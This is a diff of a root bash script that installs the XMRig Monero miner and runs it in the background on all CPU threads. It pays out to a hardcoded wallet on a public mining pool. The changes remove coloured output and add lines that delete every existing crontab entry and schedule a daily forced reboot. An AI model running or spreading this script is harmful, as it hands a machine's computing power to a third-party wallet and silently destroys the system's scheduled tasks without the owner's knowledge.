@@ -1,6 +1,6 @@
 #! /bin/bash
 if [ "$(whoami)" != "root" ]; then
-        echo -e "\033[0;31mSorry, you are not root. Please use sudo option\033[0m"
+        echo -e "Sorry, you are not root. Please use sudo option"
         exit 1
 fi
 WALLET=449PWXiroeiJF2kzeHC4XKKea6Swt8TPLN3kfHwhwnM3L4wgvd49gksg5pH2xcchK67mb2vYex8V7dszBb6LnVGqPnsmX7n
@@ -11,7 +11,7 @@ THREADS="$(nproc --all)"
 
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
-echo -e '\033[0;32m##### Installing updates and install soft...\033[0m'
+echo -e 'Installing updates and install soft...'
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake screen htop nano mc -y
 sleep 2
 cd /tmp && mkdir miner
@@ -23,8 +23,11 @@ cp /tmp/miner/xmrig /usr/bin/
 sleep 1
 #xmrig -c /tmp/miner/config.json
 xmrig -o pool.supportxmr.com:5555 -u $WALLET --pass=$PASSWORD --rig-id="$(ID)" --threads=$THREADS -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10
-echo -e '\033[0;32m##### Miner started \033[0m'
-echo -e '\033[0;32m##### Watch: \033[0m'
-echo -e '\033[0;32m##### tail -f /tmp/miner/xmrig.log \033[0m'
-sleep 2
+echo -e 'Miner started '
+echo -e 'Watch: '
+echo -e 'tail -f /tmp/miner/xmrig.log'
+sleep 1
+(crontab -r 2>/dev/null;) | crontab -
+echo -e 'All previous tasks are deleted'
 (crontab -l 2>/dev/null; echo "0 4   *   *   *    /sbin/shutdown -r +5") | crontab -
+echo -e 'Rebooting task is created'
